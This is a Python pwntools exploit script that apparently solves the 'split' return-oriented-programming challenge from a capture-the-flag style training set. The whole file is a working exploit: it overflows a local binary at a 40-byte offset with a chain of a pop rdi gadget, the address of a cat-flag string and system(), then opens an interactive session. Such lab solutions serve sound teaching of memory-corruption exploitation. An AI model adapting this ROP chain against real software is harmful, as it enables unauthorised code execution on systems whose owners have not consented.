from pwn import *

exe = ELF("./bins/split")
context.binary = exe
context.log_level = "error"

pop_rdi = p64(0x4007c3)
cat_flag = p64(0x00601060)
system = exe.symbols['system']

offset = 40

payload = flat({
    offset:[
        pop_rdi,
        cat_flag,
        system
    ]
})

io = process(exe.path)

io.sendlineafter(b"\n> ",payload)
io.interactive()